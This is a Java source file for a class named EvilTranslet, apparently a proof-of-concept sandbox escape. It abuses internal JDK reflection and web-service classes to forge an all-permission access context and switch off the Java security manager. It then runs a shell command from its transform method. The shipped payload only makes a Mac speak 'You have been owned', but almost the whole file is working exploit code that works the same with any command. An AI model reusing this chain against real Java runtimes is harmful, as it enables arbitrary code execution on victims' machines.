import com.sun.org.apache.xml.internal.dtm.*;
import com.sun.org.apache.xml.internal.serializer.*;
import com.sun.org.apache.xalan.internal.xsltc.*;
import java.io.*;
import java.security.*;
import java.beans.*;
import java.lang.reflect.*;
import java.lang.reflect.Method;
import java.util.*;
import javax.swing.*;

public class EvilTranslet extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
      {
        namesArray = new String[]{};
        urisArray = new String[]{};
        typesArray = new int[]{};
        namespaceArray = new String[]{};
      }

  private Object reflectionNavigator;
  private Method getDeclaredMethods;

  public static Object readField(Class clazz, String name) throws Exception {

    Class proxyClass = Proxy.getProxyClass(null, new Class[]{clazz});

    return proxyClass.getFields()[0].get(null);

  }


  public static Method readMethod(Class clazz, String name, Class[] args, Object[] dummyArgs) throws Exception {
    final Method[] result = new Method[1];

    InvocationHandler handler = new InvocationHandler() {
      public Object invoke(Object target, Method m, Object[] args) {
        result[0] = m;
        return null;
      }
    };

    Object proxy = Proxy.newProxyInstance(null, new Class[]{clazz}, handler);

    Class[] newArgs = new Class[args.length];
    Arrays.fill(newArgs, Object.class);

    proxy.getClass().getMethod(name, newArgs).invoke(proxy, dummyArgs);

    return result[0];
  }

  public void disableSecurity() throws Exception {
    Class getReflectionFactoryActionClass = forName("sun.reflect.ReflectionFactory$GetReflectionFactoryAction");


    Class reflectionFactoryClass = forName("sun.reflect.ReflectionFactory");

    Class classFactoryClass = forName("com.sun.xml.internal.bind.v2.ClassFactory");

    Method newInstance = findMethod(classFactoryClass, "create", new Class[]{Class.class});

    Object getReflectionFactoryAction = newInstance.invoke(null, getReflectionFactoryActionClass);

    Method doPrivileged = AccessController.class.getMethod("doPrivileged", PrivilegedAction.class);

    Method createSingleton = findMethod(forName("com.sun.xml.internal.ws.api.server.InstanceResolver"), "createSingleton", new Class[]{Object.class});

    Object resolver = createSingleton.invoke(null, new Object());

    Method createInvoker = findMethod(forName("com.sun.xml.internal.ws.api.server.InstanceResolver"), "createInvoker", new Class[]{});

    Object invoker = createInvoker.invoke(resolver);


    Method invoke = findMethod(forName("com.sun.xml.internal.ws.api.server.Invoker"), "invoke", new Class[]{forName("com.sun.xml.internal.ws.api.message.Packet"), java.lang.reflect.Method.class, java.lang.Object[].class});

    
    Object reflectionFactory = invoke.invoke(invoker, null, doPrivileged, new Object[]{getReflectionFactoryAction});

    Method newField = findMethod(reflectionFactory.getClass(), "newField", new Class[]{Class.class, String.class, Class.class, Integer.TYPE, Integer.TYPE, String.class, byte[].class});


    Method newFieldAccessor = findMethod(reflectionFactory.getClass(), "newFieldAccessor", new Class[]{Field.class, Boolean.TYPE});

    Method set = findMethod(forName("sun.reflect.FieldAccessor"), "set", new Class[]{Object.class, Object.class});

    Method get = findMethod(forName("sun.reflect.FieldAccessor"), "get", new Class[]{Object.class});

   
    Object field = newField.invoke(reflectionFactory, new Object[]{Statement.class, "acc", AccessControlContext.class, 18, 14 /*2*/, null, null});
    
    Object fieldAccessor = newFieldAccessor.invoke(reflectionFactory, new Object[]{field, Boolean.TRUE});
    
    
    Statement statement = new Statement(java.lang.System.class, "setSecurityManager", new Object[]{null});

    System.out.println(get.invoke(fieldAccessor, new Object[]{statement}));

    set.invoke(fieldAccessor, new Object[]{statement, createContext()});
    
    
    statement.execute();
    

  }    


  private Class forName(String name) throws Exception {
    return Class.forName(name);
  }


  private void setupFindMethod() throws Exception {
    Class navigatorClass = forName("com.sun.xml.internal.bind.v2.model.nav.Navigator");

    this.reflectionNavigator = readField(navigatorClass, "REFLECTION");

    this.getDeclaredMethods = readMethod(navigatorClass, "getDeclaredMethods", new Class[]{Class.class}, new Object[]{null});
  }

  private Method findMethod(Class clazz, String method, Class[] args) throws Exception {
    List<Method> methods = (List<Method>)getDeclaredMethods.invoke(this.reflectionNavigator, clazz);
    for (Method m : methods) {
      if (m.getName().equals(method) && Arrays.equals(args, m.getParameterTypes())) {
        return m;
      }
    }
    return null;
  }

  public void init() {
    try {
      setupFindMethod();
      disableSecurity();
      System.out.println(System.getProperty("user.home"));
      ProcessBuilder builder = new ProcessBuilder("/bin/bash", "-c", "osascript -e 'set volume 10' && say -v 'Hysterical' 'Ha Ha Ha Ha Ha' && say -v 'Zarvox' 'You have been owned. Java Applets are vulnerable to remote code execution'");
      builder.start();

    } catch (Exception e) {
      throw new RuntimeException(e);
    }
  }

  public static AccessControlContext createContext() {
    Permissions permission = new Permissions();
    permission.add(new AllPermission());
    
    ProtectionDomain domain = new ProtectionDomain(null, permission);
    
    AccessControlContext context = new AccessControlContext(new ProtectionDomain[]{domain});
    return context;
  }


      public  void transform(DOM document, DTMAxisIterator iterator,
                                             SerializationHandler h)
                throws TransletException {


                init();

      }

      public void transform(DOM dom,SerializationHandler[] handlers) {
      }
}
